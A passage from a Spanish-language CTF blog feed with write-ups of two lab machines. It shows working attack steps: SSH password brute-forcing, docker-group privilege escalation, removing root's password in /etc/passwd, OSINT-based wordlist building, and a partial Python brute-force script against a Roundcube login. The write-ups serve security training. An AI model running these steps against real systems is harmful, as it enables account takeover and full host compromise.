  <li><strong><code class="language-plaintext highlighter-rouge">-I enp0s3</code></strong>: Especifica la interfaz de red a utilizar (en este caso <code class="language-plaintext highlighter-rouge">enp0s3</code>).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-localnet</code></strong>: Indica que se escaneará toda la red local.</li>
</ul>

<p>Obtenemos la dirección IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code> y la dirección MAC de la máquina victima.</p>

<h3 id="escaneo-de-puertos-con-nmap">Escaneo de puertos con Nmap</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T</span> 4 10.0.2.169
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">nmap</code></strong>: Herramienta de escaneo de redes que detecta hosts, servicios y puertos abiertos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-sS</code></strong>: Realiza un escaneo “SYN” o escaneo furtivo. Detecta puertos abiertos sin establecer una conexión completa, lo que lo hace más rápido y menos detectado.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-p-</code></strong>: Escanea todos los puertos TCP (del 1 al 65535).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-Pn</code></strong>: Omite el escaneo de ping, asume que el host está activo.</li>
  <li><code class="language-plaintext highlighter-rouge">-n</code>: Evita la resolución de DNS para acelerar el escaneo.</li>
  <li><code class="language-plaintext highlighter-rouge">-v</code>: Modo detallado (verbose), muestra más información durante el escaneo.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-T 4</code></strong>: Ajusta la velocidad del escaneo, en este caso a una velocidad agresiva (T4).</li>
</ul>

<p>Se descubren dos puertos abiertos: 22 (SSH) y 80 (HTTP).</p>

<h3 id="escaneo-detallado-de-versiones-de-servicios">Escaneo detallado de versiones de servicios</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.169
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 a8da3d7dc8cdc769ceed13fadeb99650 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0324b9cc0bc21509db739bb524d541ca <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://canyouhackme.thl
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">-sCV</code></strong>: Realiza un escaneo de servicios (<code class="language-plaintext highlighter-rouge">sV</code>) para obtener la versión del software, y ejecuta scripts de detección estándar (<code class="language-plaintext highlighter-rouge">sC</code>).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-p22,80</code></strong>: Escanea únicamente los puertos 22 (SSH) y 80 (HTTP).</li>
</ul>

<p>Se identifican las versiones de los servicios:</p>

<ul>
  <li><strong>OpenSSH 9.6p1</strong> (SSH).</li>
  <li><strong>Apache 2.4.58</strong> (HTTP), con un redireccionamiento a <code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code>.</li>
</ul>

<h3 id="modificación-del-archivo-etchosts">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'10.0.2.169  canyouhackme.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.169 canyouhackme.thl
</code></pre></div></div>

<ul>
  <li><strong>/etc/hosts</strong>: Archivo que mapea direcciones IP a nombres de dominio locales.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">echo</code></strong>: Imprime la cadena ‘10.0.2.169 canyouhackme.thl’.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">sudo tee -a /etc/hosts</code></strong>: Añade (<code class="language-plaintext highlighter-rouge">-a</code>) la salida del comando <code class="language-plaintext highlighter-rouge">echo</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Esto mapea el dominio <code class="language-plaintext highlighter-rouge">canyouhackme.thl</code> a la IP <code class="language-plaintext highlighter-rouge">10.0.2.169</code>, permitiendo acceder al sitio web localmente usando el nombre de dominio.</li>
</ul>

<h3 id="interacción-con-el-servidor-web">Interacción con el servidor web</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://canyouhackme.thl
/<span class="k">*</span> Hola juan, te he dejado un correo importate, cundo puedas, leelo <span class="k">*</span>/
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">curl</code></strong>: Herramienta que realiza peticiones HTTP desde la línea de comandos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">http://canyouhackme.thl</code></strong>: Hace una petición HTTP al servidor web en <code class="language-plaintext highlighter-rouge">10.0.2.169</code> utilizando el nombre de dominio configurado en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<p>Obtenemos en el código fuente un comentario que menciona a un usuario llamado “juan” y que tiene un correo importante.</p>

<h1 id="intrusión">Intrusión</h1>

<h3 id="ataque-de-fuerza-bruta-con-patator">Ataque de fuerza bruta con <code class="language-plaintext highlighter-rouge">patator</code></h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>10.0.2.169 <span class="nv">user</span><span class="o">=</span>juan <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>~/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span> <span class="nt">-x</span> ignore:size<span class="o">=</span>53
22:26:03 patator    INFO - 0     40     0.105 | matrix                             |   610 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">patator</code></strong>: Herramienta para realizar ataques de fuerza bruta sobre diferentes protocolos. En este caso, se usa para probar múltiples contraseñas contra el servicio SSH.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">ssh_login</code></strong>: Módulo de <code class="language-plaintext highlighter-rouge">patator</code> para atacar el servicio SSH.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">host=10.0.2.169</code></strong>: Especifica el host objetivo.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">user=juan</code></strong>: Define el nombre de usuario (<code class="language-plaintext highlighter-rouge">juan</code>) para intentar iniciar sesión.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">password=FILE0</code></strong>: Indica que las contraseñas se tomarán de un archivo. El archivo se define con <code class="language-plaintext highlighter-rouge">0=~/rockyou.txt</code>, que es un diccionario común de contraseñas.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">x ignore:mesg='Authentication failed.'</code></strong>: Ignora los intentos fallidos que devuelven este mensaje.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">x ignore:size=53</code></strong>: Ignora respuestas de cierto tamaño que coincidan con intentos fallidos.</li>
</ul>

<p>Obtenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">juan</code>.</p>

<h3 id="acceso-ssh-al-servidor">Acceso SSH al servidor</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh juan@10.0.2.169
juan@10.0.2.169<span class="s1">'s password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-41-generic x86_64)
Last login: Sat Sep  7 19:26:39 2024 from 192.168.1.142
User flag: 440**********
juan@TheHackersLabs-CanYouHackMe:~$
</span></code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">ssh</code></strong>: Comando para iniciar una sesión SSH (Secure Shell) en un servidor remoto.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">juan@10.0.2.169</code></strong>: Especifica el usuario (<code class="language-plaintext highlighter-rouge">juan</code>) y el servidor (<code class="language-plaintext highlighter-rouge">10.0.2.169</code>) al que te estás conectando.</li>
</ul>

<p>Se inicia sesión en la máquina como el usuario <code class="language-plaintext highlighter-rouge">juan</code> y se recibe el “User flag”, un código que confirma que se ha logrado acceso como usuario no privilegiado.</p>

<h3 id="verificación-de-permisos-del-usuario">Verificación de permisos del usuario</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>juan<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,1002<span class="o">(</span>docker<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">id</code></strong>: Muestra la identidad y los grupos a los que pertenece el usuario actual.</li>
</ul>

<p>Se confirma que el usuario <code class="language-plaintext highlighter-rouge">juan</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">docker</code>, lo que sugiere una posible vía de escalada de privilegios.</p>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<h3 id="escalada-de-privilegios-utilizando-docker">Escalada de privilegios utilizando Docker</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt bash
Root flag: 233f3<span class="k">**************</span>
root@6f066383d815:/#
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">docker run</code></strong>: Ejecuta un contenedor Docker.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-v /:/mnt</code></strong>: Monta el sistema de archivos raíz (<code class="language-plaintext highlighter-rouge">/</code>) del host en el contenedor bajo el directorio <code class="language-plaintext highlighter-rouge">/mnt</code>. Esto da acceso completo al sistema de archivos del host.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">—rm</code></strong>: Elimina el contenedor cuando termine de ejecutarse.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">-it</code></strong>: Abre una sesión interactiva (terminal) en el contenedor.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">alpine</code></strong>: Imagen ligera de Linux (Alpine Linux) que se usará para ejecutar el contenedor.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">chroot /mnt bash</code></strong>: Cambia el directorio raíz del contenedor a <code class="language-plaintext highlighter-rouge">/mnt</code> (el sistema de archivos del host), y abre una shell Bash con acceso completo al sistema de archivos del host.</li>
</ul>

<p>Se obtiene acceso como root en el sistema del host desde dentro del contenedor Docker, permitiendo visualizar el “Root flag”.</p>

<h3 id="modificación-del-archivo-etcpasswd">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></h3>

<p>Ahora solo nos queda obtener acceso al host. Nos movemos al directorio <code class="language-plaintext highlighter-rouge">/mnt</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi ./etc/passwd
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">vi</code></strong>: Editor de texto en terminal que se usa para editar archivos.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong>: Archivo que almacena información sobre los usuarios del sistema. Cada línea representa un usuario.</li>
</ul>

<p>La línea para el usuario <code class="language-plaintext highlighter-rouge">root</code> normalmente tiene un campo de contraseña, pero se puede eliminar para permitir el acceso sin contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Esta es la línea original para el usuario <code class="language-plaintext highlighter-rouge">root</code>. El campo <code class="language-plaintext highlighter-rouge">x</code> indica que la contraseña está almacenada de forma encriptada en el archivo <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root::0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Se elimina el <code class="language-plaintext highlighter-rouge">x</code>, lo que indica que ahora el usuario <code class="language-plaintext highlighter-rouge">root</code> no tiene contraseña. Esto permitirá hacer <code class="language-plaintext highlighter-rouge">su</code> para cambiar al usuario <code class="language-plaintext highlighter-rouge">root</code> sin necesidad de una contraseña.</p>

<h3 id="acceso-como-usuario-root">Acceso como usuario root</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt <span class="c"># exit</span>
juan@TheHackersLabs-CanYouHackMe:~<span class="nv">$ </span>su
root@TheHackersLabs-CanYouHackMe:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@TheHackersLabs-CanYouHackMe:~#
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">su</code></strong>: Comando para cambiar al usuario root. Dado que se eliminó la contraseña de root en el paso anterior, ahora se puede acceder como root sin necesidad de ingresar una contraseña.</li>
</ul>

<h1 id="conclusión"><strong>Conclusión</strong></h1>

<p>Este CTF pone en práctica múltiples técnicas de hacking:</p>

<ul>
  <li><strong>Reconocimiento</strong>: Escaneo de red y de puertos para identificar servicios vulnerables.</li>
  <li><strong>Explotación</strong>: Ataque de fuerza bruta para obtener credenciales de usuario.</li>
  <li><strong>Escalada de privilegios</strong>: Uso del grupo <code class="language-plaintext highlighter-rouge">docker</code> para obtener acceso completo a la máquina mediante contenedores Docker.</li>
</ul>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">PhisermansPhriends</title><link href="/posts/PhisermansPhriends/" rel="alternate" type="text/html" title="PhisermansPhriends" /><published>2024-09-03T00:00:00+00:00</published><updated>2024-09-03T00:00:00+00:00</updated><id>/posts/PhisermansPhriends</id><content type="html" xml:base="/posts/PhisermansPhriends/"><![CDATA[<p><img src="/assets/images/phisermans/0.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por mi de dificultad <strong>Profesional</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Empiezamos buscando la dirección IP del servidor en la red local:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
10.0.2.15      08:00:27:64:b7:09       <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <strong>10.0.2.15.</strong></p>

<p>Ahora vamos a realizar un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <strong>10.0.2.15:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.15
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
</code></pre></div></div>

<p>Vemos que tiene los puertos <strong>22 y 80</strong> abiertos y el <strong>443</strong> <strong>cerrado</strong>. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.15
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 33:e6:06:ab:20:8a:bc:9a:ce:c8:75:0f:aa:64:14:62 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 65:1d:29:46:6e:f2:fe:0d:b8:0e:63:8c:0d:f5:a1:cc <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.61
|_http-server-header: Apache/2.4.61 <span class="o">(</span>Debian<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://phisermansphriends.thl/
</code></pre></div></div>

<p>Vemos que el servidor web nos redirige a un dominio, lo agregamos al fichero <strong>/etc/hosts</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'10.0.2.15 phisermansphriends.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.15 phisermansphriends.thl
</code></pre></div></div>

<p>Vamos a ver que hay en esa web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://phisermansphriends.thl
&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
  &lt;body&gt;
    &lt;p&gt;Estamos modificando la web. Contacto: mur.rusko@phisermansphriends.thl y admin@phisermansphriends.thl&lt;/&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Vemos que hay 2 emails de contacto, los anotamos.</p>

<p>Ahora vamos a buscar subdominios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.0.2.15 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-H</span> <span class="s1">'Host: FUZZ.phisermansphriends.thl'</span> <span class="nt">-c</span> <span class="nt">-fw</span> 20
intranet                <span class="o">[</span>Status: 403, Size: 589, Words: 309, Lines: 6, Duration: 9ms]
mail                    <span class="o">[</span>Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 47ms]
</code></pre></div></div>

<p>Encontramos 2 subdominios, intranet (jenkins) y mail (roundcube), los añadimos al fichero <strong>hosts</strong>.</p>

<p>Como tenemos 2 emails vamos a buscar por las redes sociales a ver si encontramos algún usuario que pueda pertenecer a los usuarios encontrados. En instagram encontramos el perfil de <a href="https://www.instagram.com/mur.rusko/">mur.rusko</a>.  En el post que tiene publicado podemos leer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🚀 ¡Hola a todos!

Me presento, soy **Mur Rusko** y hoy quiero compartir con ustedes una parte muy especial de mi vida. Nací el **20 de mayo de 1990**, y desde entonces he aprendido que la pasión por lo que haces es lo que realmente impulsa el éxito.

Es por eso que fundé **PhisermansPhriends**, una empresa que combina mi amor por la tecnología con mi compromiso de ofrecer soluciones innovadoras y de alta calidad. Nuestro objetivo es acompañar a nuestros clientes en cada paso de su camino hacia el éxito, brindando un servicio excepcional que va más allá de sus expectativas.

Además, me gustaría presentarles a un miembro muy importante de mi equipo, mi fiel compañero **Rufo** 🐾. Él nos recuerda cada día la importancia de la lealtad, la perseverancia y la energía positiva, valores que aplicamos en cada proyecto que emprendemos.

Estoy emocionado por lo que el futuro tiene reservado para **PhisermansPhriends** y estoy seguro de que juntos podemos lograr grandes cosas. 

Gracias a todos los que ya forman parte de este viaje y a los que se unirán pronto. ¡Vamos por más!

#emprendimiento #innovación #equipo #PhisermansPhriends #MurRusko #Rufo
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vamos a gener un diccionario con los datos. Usaremos la herramienta <strong>CUPP.</strong></p>

<p>Clonamos CUPP:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Mebus/cupp.git
</code></pre></div></div>

<p>Lo ejecutamos y rellenamos los datos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python cupp.py <span class="nt">-i</span>
 ___________ 
   cupp.py!                 <span class="c"># Common</span>
      <span class="se">\ </span>                    <span class="c"># User</span>
       <span class="se">\ </span>  ,__,             <span class="c"># Passwords</span>
        <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span>____         <span class="c"># Profiler</span>
           <span class="o">(</span>__<span class="o">)</span>    <span class="o">)</span><span class="se">\ </span>  
              <span class="o">||</span><span class="nt">--</span><span class="o">||</span> <span class="k">*</span>      <span class="o">[</span> Muris Kurgas | j0rgan@remote-exploit.org <span class="o">]</span>
                            <span class="o">[</span> Mebus | https://github.com/Mebus/]

<span class="o">[</span>+] Insert the information about the victim to make a dictionary
<span class="o">[</span>+] If you don<span class="s1">'t know all the info, just hit enter when asked! ;)

&gt; First Name: Mur
&gt; Surname: Rusko
&gt; Nickname: mur.rusko
&gt; Birthdate (DDMMYYYY): 20051990

&gt; Partners) name: 
&gt; Partners) nickname: 
&gt; Partners) birthdate (DDMMYYYY): 

&gt; Child'</span>s name: 
<span class="o">&gt;</span> Child<span class="s1">'s nickname: 
&gt; Child'</span>s birthdate <span class="o">(</span>DDMMYYYY<span class="o">)</span>: 

<span class="o">&gt;</span> Pet<span class="s1">'s name: Rufo
&gt; Company name: PhisermansPhriends

&gt; Do you want to add some key words about the victim? Y/[N]: 
&gt; Do you want to add special chars at the end of words? Y/[N]: 
&gt; Do you want to add some random numbers at the end of words? Y/[N]:
&gt; Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mur.txt, counting 3252 words.
&gt; Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with mur.txt and shoot! Good luck!

</span></code></pre></div></div>

<p>Si nos fijamos en las peticiones al servicio de mail, vemos que tiene un token CSRF que va cambiando con cada petición. Necesitaremos un script que realice ese cambio de token para poder realizar el ataque de fuerza bruta.</p>

<p>Usamos el siguiente script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">from</span> <span class="n">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>

<span class="n">settings</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">threads</span><span class="sh">"</span> <span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">mur.rusko@phisermansphriends.thl</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">http://mail.phisermansphriends.thl/</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span> <span class="p">:</span> <span class="sh">'</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><span class="sh">'</span>
<span class="p">}</span>

<span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">console_mode</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Command line mode</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--threads</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-t</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Number of Threads</span><span class="sh">'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
    <span class="nf">if </span><span class="p">(</span><span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"'</span><span class="s">--threads</span><span class="sh">'</span><span class="s"> was omitted</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">settings</span><span class="p">[</span><span class="sh">"</span><span class="s">threads</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">threads</span>

<span class="k">def</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="sh">'</span><span class="s">request_token</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">(.*)</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">login</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">?_task=login</span><span class="sh">'</span><span class="p">,</span>
                          <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">_task</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_timezone</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Europe/Madrid</span><span class="sh">"</span><span class="p">,</span>
